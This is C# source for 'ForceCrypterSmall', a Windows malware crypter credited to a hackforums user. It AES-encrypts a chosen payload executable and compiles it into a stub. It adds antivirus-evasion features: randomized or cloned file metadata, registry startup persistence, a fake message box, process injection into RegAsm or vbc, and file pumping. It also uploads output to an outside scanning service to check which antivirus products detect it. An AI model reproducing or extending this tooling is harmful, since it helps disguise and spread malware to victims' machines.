using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Configuration;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Resources;
using Microsoft.Win32;
using ForceCrypterSmall.Resources;
using System.Globalization;
using System.Security.Cryptography;
using System.Net;

//Copyright 2016
//Made by mrmutt for hackforums uid=3005497
//Please leave this note here
namespace ForceCrypterSmall
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            
            InitializeComponent();
            Size T = Screen.PrimaryScreen.WorkingArea.Size;
            Location = new Point(T.Width / 2 - Width / 2, T.Height / 2 - Height / 2);
        }

        private string RandomString(int length)
        {
            //Making a random string from the pool
            string pool = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWKYZ1234567890";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }
        
        private string RandomNumber(int _length)
        {
            //Making a random number for the random assemblys version
            string pool = "0123456789";
            pool += pool.ToUpper();
            string tmp = "";
            Random R = new Random();
            for (int x = 0; x < _length; x++)
            {
                tmp += pool[R.Next(0, pool.Length)].ToString();
            }
            return tmp;
        }

        public void Pump(string file, int amount, bool random)
        {
            //Pumping function
            FileStream fs = new FileStream(file, FileMode.Append, FileAccess.Write);
            byte[] bytes = new byte[amount];
            if (random)
            {
                Random rand = new Random();
                rand.NextBytes(bytes);
            }
            fs.Write(bytes, 0, amount);
            fs.Close();
        }

        private void btnPayload_Click(object sender, EventArgs e)
        {
            //Open file dialog to let the user select a payload
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    ofd.Filter = "Payload|*.exe";
                    txtPayload.Text = ofd.FileName;
                }

            }
        }

        private void btnIcon_Click_1(object sender, EventArgs e)
        {
            //Open file dialog that lets the user to pick a icon
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Icon|*.ico";
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    txtIcon.Text = ofd.FileName;
                }
            }
        }
        
        
       
        

        private void btnRandomize_Click_1(object sender, EventArgs e)
        {
            //Giving the assembly information text boxes random strings and numbers.
            txtVersion.Text = RandomString(9);
            txtCompany.Text = RandomString(16);
            txtProduct.Text = RandomString(19);
            txtCopyright.Text = RandomString(21);
            txtTrademark.Text = RandomString(18);
            txtVersion.Text = (RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(1) + "." + RandomNumber(1));
            txtFVersion.Text = (RandomNumber(1) + "." + RandomNumber(1) + "." + RandomNumber(2) + "." + RandomNumber(2));
            txtDescription.Text = RandomString(17);
            txtTitle.Text = RandomString(15);
        }

        private void btnClone_Click_1(object sender, EventArgs e)
        {
            // Selecting a file to clone
            using (OpenFileDialog ofd = new OpenFileDialog())
            {
                ofd.Filter = "Excutables|*.exe";
                if (ofd.ShowDialog() == System.Windows.Forms.DialogResult.OK)
                {
                    //File version info is all the assembly information about the file we picked with the open file dialog
                    
                    FileVersionInfo myFileVersionInfo =
                    FileVersionInfo.GetVersionInfo(ofd.FileName);
                    //Changing the text boxes test to be the assembly information of the file we selected
                    txtFVersion.Text = myFileVersionInfo.FileVersion;
                    txtVersion.Text = myFileVersionInfo.ProductVersion;
                    txtProduct.Text = myFileVersionInfo.CompanyName;
                    txtDescription.Text = myFileVersionInfo.FileDescription;
                    txtCopyright.Text = myFileVersionInfo.LegalCopyright;
                    txtTrademark.Text = myFileVersionInfo.LegalTrademarks;
                    txtProduct.Text = myFileVersionInfo.ProductName;
                    txtTitle.Text = myFileVersionInfo.InternalName;
                    txtCompany.Text = myFileVersionInfo.CompanyName;

                }
            }
        }

        private void btnCrypt_Click_1(object sender, EventArgs e)
        {
            //Letting the user choose where to save the crypted file
            SaveFileDialog FSave = new SaveFileDialog()
            {
                Filter = "Executable Files|*.exe",
                InitialDirectory = Environment.GetFolderPath(Environment.SpecialFolder.Desktop)
            };
            
            
            //If he choose and everything is good
            if (FSave.ShowDialog() == DialogResult.OK)
            {
                
                //Refrencing our stub
                string boop = Properties.Resources.boop;
                //Assembly information
                boop = boop.Replace("[title-replace]", txtTitle.Text);
                boop = boop.Replace("[company-replace]", txtCompany.Text);
                boop = boop.Replace("[product-replace]", txtProduct.Text);
                boop = boop.Replace("[copyright-replace]", txtCopyright.Text);
                boop = boop.Replace("[trademark-replace]", txtTrademark.Text);
                boop = boop.Replace("[desc-replace]", txtDescription.Text);
                boop = boop.Replace("[version-replace]", txtVersion.Text);
                boop = boop.Replace("[fversion-replace]", txtFVersion.Text);
                //Checking if the user checked startup and if he did replace the bool in stub.
                boop = boop.Replace("[startup-replace]", cbStartup.Checked ? "true" : "false");
                //Another startup check
                if (cbStartup.Checked)
                {
                    //RegisteryKey
                    boop = boop.Replace("[regfname-replace]", txtFName.Text);
                    boop = boop.Replace("[regfiname-replace]", txtStartup.Text);
                    boop = boop.Replace("[regkey-replace]", txtRegKey.Text);
                    //FolderName
                    boop = boop.Replace("[fname-replace]", txtFName.Text);
                    //FileName
                    boop = boop.Replace("[finame-replace]", txtStartup.Text);
                }
              
               
                if (cbMsgBox.Checked)
                {
                    boop = boop.Replace("[fakemessage-replace]", "true");
                    boop = boop.Replace("[messagetitle-replace]", txtMsgTitle.Text);
                    boop = boop.Replace("[messagetext-replace]", txtMsg.Text);
                }
                else
                {
                    boop = boop.Replace("[fakemessage-replace]", "false");
                }
                string encryptionkey = RandomString(300);
                //Replacing the key in the stub with our encryption key
                boop = boop.Replace("[key-replace]", encryptionkey);
                //Reading the bytes from our payload
                byte[] fBytes = File.ReadAllBytes(txtPayload.Text);
                //Crypting process
                string fCrypted = Convert.ToBase64String(fBytes);
                //Crypting process
                byte[] first = Encoding.UTF8.GetBytes(fCrypted);
                //Getting the bytes from the encryption key
                byte[] enckey = Encoding.UTF8.GetBytes(encryptionkey);
                //Making a hash for the key
                enckey = SHA256.Create().ComputeHash(enckey);
                //Encrypting the bytes of the payload
                byte[] encBytes = Encboop.AESEncrypt(first, enckey);
                //Injection methods               
                if (rbItself.Checked)
                
                    boop = boop.Replace("[inject-replace]", "[itself]");
                if(rbRegAsm.Checked)
                    boop = boop.Replace("[inject-replace]", "[regasm]");
                if(rbVbc.Checked)
                    boop = boop.Replace("[inject-replace]", "[vbc]");
                    //Checking if user wanted delay
                    if(txtDelay.Text!=null)
                    boop = boop.Replace("[delay-replace]", txtDelay.Text);
                    if(txtDelay.Text == ""| txtDelay.Text == null)
                    boop = boop.Replace("[delay-replace]", "0");

                

                   
                    bool worked;
                    //Our resource file
                    string ResF = Path.Combine(Application.StartupPath, "Encrypted.resources");
                    //Using a resourcewriter on our resource file
                    using (var Writer = new ResourceWriter(ResF))
                    {
                        //Adding the encrypted bytes to the resource file
                        Writer.AddResource("encfile", encBytes);
                       
                        //Generating             
                        Writer.Generate();
                    }
                   //If there is a icon compile with icon
                if (File.Exists(txtIcon.Text))
                        worked = Compiler.CompileFromSource(boop, FSave.FileName, txtIcon.Text, new string[] {ResF});
                   //If not compile without
                    else
                        worked = Compiler.CompileFromSource(boop, FSave.FileName, null, new string[] {ResF});

                    //If worked show a messagebox
                    if (worked)
                        MessageBox.Show("Forced!", "Succsess!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    //If user chose to pump we pump the output file
                    if (cbPump.Checked)
                    {
                        if (rbRandomBytes.Checked)
                        {
                            Pump(FSave.FileName, int.Parse(txtPump.Text)*8*124, true);

                        }
                        else
                        {
                            Pump(FSave.FileName, int.Parse(txtPump.Text)*8*124, false);
                        }
                    }
                }
            }
        public void Scan(string Filename) //File Scan
        {
            try
            {
                WebClient WBC = new WebClient(); //New WebClient
                WBC.UploadFileCompleted += new UploadFileCompletedEventHandler(GetResults); //Adding Handler For Completion of  WebClient Upload
                WBC.UploadFileAsync(new Uri("https://www.pscan.xyz/api.php"), "POST", Filename); //Upload File for scan
                while (WBC.IsBusy) { Application.DoEvents(); } // While Webclient is busy Do other Events
            }
            catch (Exception ex)

            {
                this.btnScan.Enabled = true;
                MessageBox.Show(ex.Message); //Show Messagebox On Error
            }
        }
        private void GetResults(object sender, System.Net.UploadFileCompletedEventArgs e) //Get  Response from Server
        {
            try
            {
                string Results = System.Text.Encoding.UTF8.GetString(e.Result); //Get Response
                AddtoLV(Results); //Add Response to Listivew
                this.btnScan.Enabled = true;
            }
            catch (Exception ex)
            {
                this.btnScan.Enabled = true;
                MessageBox.Show(ex.Message); //Show Messagebox On Error
            }
        }
        private void AddtoLV(string response) //Add Response to Listview
        {
            listView1.Items.Clear(); //Remove scanned file trace
            try
            {
                string[] AVDelimiter = new string[] { "[NextAV]" }; //AVs Delimiter
                string[] AV = response.Split(AVDelimiter, StringSplitOptions.RemoveEmptyEntries); // AVs Splitter
                string[] Delimiter1 = new string[] { "[ResultDetails]" }; //Result Details Delimiter
                string[] ScanDetails = response.Split(Delimiter1, StringSplitOptions.RemoveEmptyEntries); //Split Results from Details
                string[] Links = new string[] { "[Details]" }; //Details Delimiter
                string[] ii = ScanDetails[1].Split(Links, StringSplitOptions.RemoveEmptyEntries); //Split Scan Details
                txtScanRate.Text = ii[4]; //Detection Rate
                txtScanLink.Text = ii[5]; //Scan Results Link
                int processed = 0; //AV Counter
                foreach (var i in AV) //Split Each AV
                {
                    if (++processed == 36) break; //Stop Adding when Added all 35 AVs
                    string[] fa = new string[] { "[]Result[]" }; //Delimiter 
                    string[] fr = i.Split(fa, StringSplitOptions.RemoveEmptyEntries); //Split AV From Result
                    ListViewItem x = new ListViewItem(fr[0]); //Add item AV
                    x.SubItems.Add(fr[1]); //Add AV result to Item
                    if (fr[1] == "OK")
                    {
                        x.ForeColor = Color.ForestGreen; //Lime Color For Clean Result
                    }
                    else
                    {
                        x.ForeColor = Color.Red; //Red Color for Infected Result
                    }
                    listView1.Items.Add(x); //Add AV and its Result to Listivew
                }
            }
            catch (Exception ex) { MessageBox.Show(ex.Message); } //Message Anny error Occured
        }

        private void btnScanFile_Click(object sender, EventArgs e)
        {
            OpenFileDialog OFD = new OpenFileDialog(); //New OpenFileDialog
            DialogResult result = OFD.ShowDialog(); // Show OpenFileDialog
            if (result == DialogResult.OK) // Test result.               
            { txtScanFile.Text = OFD.FileName; }
        }

        private void btnScan_Click(object sender, EventArgs e)
        {
            this.btnScan.Enabled = false;
            Scan(txtScanFile.Text);
        }
    }
}
